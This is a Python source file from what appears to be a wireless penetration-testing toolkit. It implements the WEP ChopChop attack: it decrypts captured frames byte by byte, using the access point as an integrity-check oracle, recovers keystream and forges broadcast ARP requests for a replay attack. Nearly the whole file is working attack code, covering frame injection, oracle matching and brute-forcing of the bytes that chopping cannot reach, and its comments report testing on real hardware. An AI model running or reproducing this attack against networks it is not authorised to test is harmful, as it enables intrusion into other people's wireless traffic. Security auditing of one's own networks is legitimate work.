"""WEP ChopChop attack (`aireplay-ng -4`) — M6.

Decrypts a captured frame byte-by-byte using the AP as an ICV oracle, no key:
chop the last byte, guess its plaintext (≤256), fix the ICV
(wep_crypto.chop_last_byte_and_fixup — CRC32 is linear), re-header to
broadcast-from-us, send. The AP relays the shortened frame IFF the guess was
right (verified on hardware: only the one valid-ICV guess relays; the latency
is ~3ms). Walk backwards recovering one keystream byte per accepted guess →
enough keystream to forge a broadcast ARP → hand to replay.

ORACLE (pinned from the probe, scripts/wep/chopchop_probe.py): a Data frame,
FromDS + Protected, Addr1(DA)=broadcast, **Addr3(SA)=our forged STA**, ~1 byte
shorter than what we sent. Match on SA (the box echoes onto sibling BSSes, so
de-dup); per-guess relay timeout ~20ms (3ms observed + margin).

Keystream recovery (the offline-testable core, `_recover_keystream`): the
keystream is fixed per IV, so at each chop step the accepted guess gives the
original keystream byte directly — ks[i] = body[i] XOR guess — recovered from
the end inward. The first 16 plaintext bytes of a broadcast ARP are known
(LLC/SNAP + ARP-request header), so we only chop the variable tail (positions
16..39) and fill ks[0..15] from the known prefix; that also avoids chopping the
frame down to a too-short-to-relay size.

Lifecycle mirrors WepFragmentation (start/stop/state, on_forged_arp, keep-
retrying). No sw_seq needed (single frames, not a reassembled train). Slower
than fragmentation (≤256 round-trips/byte) — the user-chosen fallback when frag
gets no response. The campaign pauses replay before running this and resumes it
on success with the forged ARP.
"""

from __future__ import annotations

import asyncio
import logging
import time
from typing import Awaitable, Callable, Optional

from wifit3.engine.models import AccessPoint
from wifit3.engine.attacks.wep.wep_crypto import (
    arp_request_plaintext,
    chop_last_byte_and_fixup,
    forge_arp_request,
    icv,
)

logger = logging.getLogger(__name__)

_BROADCAST = b"\xff" * 6
# Known plaintext prefix of a broadcast ARP REQUEST: LLC/SNAP (6) + ethertype
# 0x0806 (2) + ARP htype/ptype/hlen/plen/op-request (8) = 16 bytes. ks[0..15] =
# cipher[0..15] XOR this, so we don't chop them (and don't shrink the frame to a
# too-short-to-relay size). Assumes the captured broadcast frame is an ARP
# request — overwhelmingly true for broadcast; a stray reply just yields a bad
# forge that replay won't lock onto, and we move to another seed.
_KNOWN_ARP16 = bytes([
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
    0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
])


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _hdr_len(fc0: int, fc1: int) -> int:
    n = 24
    if (fc1 & 0x01) and (fc1 & 0x02):
        n += 6
    if ((fc0 & 0xF0) >> 4) & 0x08:
        n += 2
    if fc1 & 0x80:
        n += 4
    return n


class WepChopChop:
    """ChopChop daemon: chop a captured ARP byte-by-byte via the AP oracle →
    recover keystream → forge a broadcast ARP → hand to replay."""

    # Per-guess wait for the relay (oracle). ~3ms observed on hardware + margin.
    _ORACLE_TIMEOUT_S = 0.02
    _ORACLE_POLL_S = 0.002
    # A byte that yields no relay across all 256 guesses gets one re-sweep (the
    # correct guess's single send may have been lost) before we give up on the
    # seed.
    _BYTE_RETRIES = 2
    _HEARTBEAT_S = 5.0
    # The AP stops relaying frames once they get too short, so the last
    # keystream byte(s) just above the known prefix can be unreachable by
    # chopping. We brute-force a gap this small with FULL-length forged frames
    # (well above the size wall): 1 byte = 256 candidates, the valid one relays.
    _MAX_BRUTE_BYTES = 1

    def __init__(
        self,
        iface,
        target: AccessPoint,
        store,
        source_mac: bytes,
        on_forged_arp: Callable[[bytes], None],
        can_inject: Optional[Callable[[], bool]] = None,
        notify_activity: Optional[Callable[[], None]] = None,
        log_callback: Optional[Callable[[str], None]] = None,
        sender_ip: bytes = bytes([192, 168, 1, 123]),
        target_ip: bytes = bytes([192, 168, 1, 1]),
        oracle: Optional[Callable[[bytes], Awaitable[bool]]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.store = store
        self.source_mac = source_mac
        self._on_forged_arp = on_forged_arp
        self._can_inject = can_inject or (lambda: True)
        # Our guesses ARE activity — feed this so fake-auth's periodic keepalive
        # re-auth doesn't fire mid-chop (a long byte-walk would otherwise hit
        # the inactivity timer and re-auth in the middle of guessing).
        self._notify_activity = notify_activity or (lambda: None)
        self._log = log_callback or (lambda _m: None)
        self._sender_ip = sender_ip
        self._target_ip = target_ip
        # The oracle is injectable so the byte-walk is unit-testable offline
        # (a simulated decrypt-and-check-ICV). Default = the live AP.
        self._oracle = oracle or self._hw_oracle

        self.state = "idle"        # idle|waiting-auth|seeding|chopping|success
        self._active = False
        self._task: Optional[asyncio.Task] = None
        self._tried: set = set()   # seed IVs that stalled
        self._bytes_done = 0       # progress for the UI
        self._bytes_total = 0

        # Current chop target's IV + KeyID (for building frames / forging).
        self._cur_iv = b""
        self._cur_keyid = 0
        # Oracle signal: set by the RX callback when the AP relays our frame.
        self._relay_seen = False
        # Length the relay must match THIS guess. Critical: a correct guess can
        # echo onto sibling BSSes (2+ relays); the late echo from byte N lands
        # during byte N+1's sweep — but byte N's relay is 1 byte LONGER, so
        # matching the exact expected length rejects the stale echo (else it
        # false-accepts the next byte → corrupts the walk → stalls).
        self._expected_relay_len = 0
        self._last_heartbeat = 0.0

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.iface.register_rx_callback(self._rx_cb)
        self._task = asyncio.create_task(self._loop())
        logger.info("[WEP-Chop] Started on %s as %s",
                    self.bssid, self.source_mac.hex())

    def stop(self):
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if self._task:
            self._task.cancel()
            self._task = None
        self.state = "idle"
        logger.info("[WEP-Chop] Stopped (%d bytes recovered).", self._bytes_done)

    @property
    def is_active(self) -> bool:
        return self._active

    # ---- Seed selection -----------------------------------------------------

    def _wep_body(self, captured: bytes):
        """(iv, keyid, cipher) from a captured broadcast WEP frame, or None."""
        if len(captured) < 28:
            return None
        body = captured[_hdr_len(captured[0], captured[1]):]
        if len(body) < 44:                 # need IV+KeyID + >=40B cipher (ARP)
            return None
        return body[:3], body[3], body[4:]

    def _pick_target(self) -> bool:
        """Choose a not-yet-stalled captured broadcast ARP to chop."""
        for raw in reversed(self.store.arp_candidates(self.bssid)):
            parsed = self._wep_body(raw)
            if not parsed:
                continue
            iv, keyid, cipher = parsed
            if iv in self._tried:
                continue
            self._cur_iv, self._cur_keyid = iv, keyid
            self._bytes_done = 0
            self._bytes_total = len(cipher) - len(_KNOWN_ARP16)
            self._log(
                f"[green]ChopChop:[/green] chopping IV {iv.hex()} "
                f"[dim]({len(cipher)}B cipher, {self._bytes_total} bytes to "
                f"recover)[/dim]"
            )
            return cipher
        return None

    # ---- The byte-walk (offline-testable core) ------------------------------

    async def _recover_keystream(self, cipher: bytes):
        """Chop ``cipher`` from the end down toward the known 16-byte ARP
        prefix, recovering the keystream byte at each accepted guess. Returns
        (ks, gap) — ks with the known prefix filled in, and gap = the list of
        low positions chopping couldn't reach (the AP's too-short-to-relay
        wall). gap is [] on a full walk, or None if it stalled before making
        any progress (a dead seed)."""
        nknown = len(_KNOWN_ARP16)
        if len(cipher) < nknown + 4:
            return None, None
        ks = bytearray(len(cipher))
        body = bytes(cipher)
        stall_pos = nknown - 1            # -1 relative to nknown = full walk
        while len(body) > nknown:
            if not self._active:
                return None, None
            accepted = await self._find_accepted(body)
            if accepted is None:
                stall_pos = len(body) - 1     # couldn't recover this position
                self._log(
                    f"[yellow]ChopChop: chopping wall at byte {stall_pos}[/yellow] "
                    f"[dim]({len(body) + 24}B frame too short to relay)[/dim]"
                )
                break
            ks[len(body) - 1] = body[-1] ^ accepted
            body = chop_last_byte_and_fixup(body, accepted)
            self._bytes_done += 1
            self._maybe_heartbeat()
        for i in range(nknown):
            ks[i] = cipher[i] ^ _KNOWN_ARP16[i]
        gap = list(range(nknown, stall_pos + 1))   # unreachable low positions
        return bytes(ks), gap

    async def _find_accepted(self, body: bytes) -> Optional[int]:
        """Sweep ALL 256 guesses for ``body``'s last byte and return the one the
        AP relays (re-confirmed), or None.

        Exactly one byte is mathematically valid per step (the ICV residue is
        unique). We CONFIRM each apparent hit (re-send; a misattributed
        sibling-BSS echo / timing slip won't repeat) to reject false positives.
        DIAGNOSTIC: we sweep the FULL 256 (not stop at the first) and COUNT the
        confirmed responders — if it's ever >1, the uniqueness assumption is
        wrong and we sound the alarm. (Slower than early-return; here to settle
        exactly that question.)"""
        for _attempt in range(self._BYTE_RETRIES):
            responders = []
            for guess in range(256):
                if not self._active:
                    return None
                shortened = chop_last_byte_and_fixup(body, guess)
                if await self._oracle(shortened) and await self._confirm(shortened):
                    responders.append(guess)
            if responders:
                self._warn_if_multiple(responders, len(body) - 1)
                return responders[0]
        return None

    def _warn_if_multiple(self, responders: list, position: int) -> None:
        """Sound the alarm if more than one byte value got relayed at a
        position — the ICV residue is supposed to make exactly one valid."""
        if len(responders) > 1:
            self._log(
                f"[bold red on yellow] ⚠ WEE WOO [/bold red on yellow] "
                f"[bold red]{len(responders)} byte values relayed at position "
                f"{position}:[/bold red] "
                f"{', '.join(f'0x{g:02x}' for g in responders)} "
                "[dim](expected exactly 1 — uniqueness violated?!)[/dim]"
            )

    async def _confirm(self, shortened: bytes) -> bool:
        """Re-send a relaying guess to confirm it's the true byte, not a
        misattributed relay. Two tries (tolerates a single re-send loss)."""
        for _ in range(2):
            if not self._active:
                return False
            if await self._oracle(shortened):
                return True
        return False

    # ---- Live-AP oracle -----------------------------------------------------

    def _build_frame(self, body_cipher: bytes) -> bytes:
        """Re-header a (chopped or forged) cipher to a broadcast frame from us,
        reusing the chop target's IV + KeyID."""
        hdr = (b"\x08\x41" + b"\x00\x00"        # Data, ToDS=1, Protected=1
               + self.bssid_bytes + self.source_mac + _BROADCAST + b"\x00\x00")
        return hdr + self._cur_iv + bytes([self._cur_keyid]) + body_cipher

    async def _hw_oracle(self, shortened_cipher: bytes) -> bool:
        """Send the chopped frame and watch for the AP relaying it (the pinned
        signature, in _rx_cb). True = relayed = the guess was correct."""
        # Don't burn guesses while de-associated (a reactive re-auth in flight)
        # — wait briefly for the association to come back, so we never miss the
        # correct guess by sending it into the void.
        waited = 0.0
        while self._active and not self._can_inject() and waited < 5.0:
            await asyncio.sleep(0.1)
            waited += 0.1
        frame = self._build_frame(shortened_cipher)
        # The AP re-encrypts the same-length shortened payload, so the relay is
        # exactly as long as what we sent — match on that to reject stale echoes
        # from the previous (longer) chop step.
        self._expected_relay_len = len(frame)
        self._relay_seen = False
        try:
            await self.iface.send_raw(frame, use_no_ack=True)
        except Exception:
            logger.exception("[WEP-Chop] send_raw failed")
            return False
        self._notify_activity()   # keep the assoc alive — no periodic re-auth
        deadline = time.time() + self._ORACLE_TIMEOUT_S
        while time.time() < deadline:
            if self._relay_seen:
                return True
            await asyncio.sleep(self._ORACLE_POLL_S)
        return self._relay_seen

    def _rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        """Pinned oracle signature: Data + FromDS + Protected + DA=broadcast +
        Addr3(SA)==our STA. Match on SA (box echoes onto sibling BSSes)."""
        if not self._active or len(frame) < 24:
            return
        fc0, fc1 = frame[0], frame[1]
        if ((fc0 >> 2) & 0x03) != 2 or not (fc1 & 0x40):    # data + Protected
            return
        if not (fc1 & 0x02) or (fc1 & 0x01):                # FromDS, not ToDS
            return
        if frame[4:10] != _BROADCAST:                       # DA broadcast
            return
        if frame[16:22] != self.source_mac:                 # SA == us
            return
        if len(frame) != self._expected_relay_len:          # THIS guess's relay
            return                                          # (rejects stale echo)
        self._relay_seen = True

    # ---- Main loop ----------------------------------------------------------

    async def _loop(self) -> None:
        try:
            while self._active:
                if not self._can_inject():
                    self._set_state("waiting-auth")
                    await asyncio.sleep(0.2)
                    continue
                cipher = self._pick_target()
                if not cipher:
                    self._set_state("seeding")
                    await asyncio.sleep(0.3)
                    self._maybe_heartbeat()
                    continue

                self._set_state("chopping")
                ks, gap = await self._recover_keystream(cipher)
                if not self._active:
                    return
                if ks is None or gap is None or len(gap) > self._MAX_BRUTE_BYTES:
                    # No progress, or the unreachable gap is too big to brute —
                    # blacklist this seed and try another. Keep retrying (never
                    # auto-stop), per the locked design.
                    self._tried.add(self._cur_iv)
                    continue

                forged = self._forge_full(ks) if not gap \
                    else await self._brute_force_forge(ks, gap)
                if not self._active:
                    return
                if forged is None:
                    self._tried.add(self._cur_iv)
                    continue
                self._succeed(forged)
                return
        except asyncio.CancelledError:
            pass

    def _forge_full(self, ks: bytes) -> bytes:
        """Forge a broadcast ARP from a fully-recovered keystream."""
        return self._build_frame(forge_arp_request(
            ks[:40], sender_mac=self.source_mac,
            sender_ip=self._sender_ip, target_ip=self._target_ip,
        ))

    async def _brute_force_forge(self, ks: bytes, gap: list):
        """Chopping couldn't reach the low ``gap`` byte(s) (frame too short).
        Brute-force them with FULL-length forged ARPs (well above the size
        wall): vary the gap cipher byte(s) until the AP relays one (valid ICV).
        Returns the valid forged frame, or None."""
        plain = arp_request_plaintext(
            sender_mac=self.source_mac,
            sender_ip=self._sender_ip, target_ip=self._target_ip,
        )
        full = plain + icv(plain)                          # 40 B known plaintext
        cipher = bytearray(p ^ ks[i] for i, p in enumerate(full))
        p = gap[0]                                         # _MAX_BRUTE_BYTES == 1
        self._log(
            "[green]ChopChop:[/green] [dim]chopping wall hit — brute-forcing "
            "the last byte (256 forged ARPs)…[/dim]"
        )
        responders = []
        for g in range(256):
            if not self._active:
                return None
            cipher[p] = g
            cand = bytes(cipher)
            if await self._oracle(cand) and await self._confirm(cand):
                responders.append((g, cand))
        if not responders:
            # Say WHY instead of going silent: 0 relays means our recovered
            # keystream is wrong somewhere (a bad chopped byte), or the AP went
            # quiet — either way this seed is dead.
            self._log(
                "[yellow]ChopChop: brute-force found NO relaying byte[/yellow] "
                "[dim](recovered keystream is off, or the AP went quiet — "
                "trying another seed)[/dim]"
            )
            return None
        self._warn_if_multiple([g for g, _ in responders], p)
        return self._build_frame(responders[0][1])

    def _succeed(self, forged: bytes) -> None:
        self._set_state("success")
        self._log(
            "[green]✓ ChopChop recovered keystream[/green] [dim](forged a "
            "broadcast ARP — handing to replay)[/dim]"
        )
        # Immediate handoff (mirrors frag): stop, hand the forged ARP over.
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        try:
            self._on_forged_arp(forged)
        except Exception:
            logger.exception("[WEP-Chop] on_forged_arp callback failed")

    # ---- Logging ------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        self.state = state

    def _maybe_heartbeat(self) -> None:
        now = time.time()
        if now - self._last_heartbeat < self._HEARTBEAT_S:
            return
        self._last_heartbeat = now
        if self.state == "chopping":
            self._log(
                f"[green]ChopChop:[/green] [dim]byte {self._bytes_done}/"
                f"{self._bytes_total} recovered…[/dim]"
            )
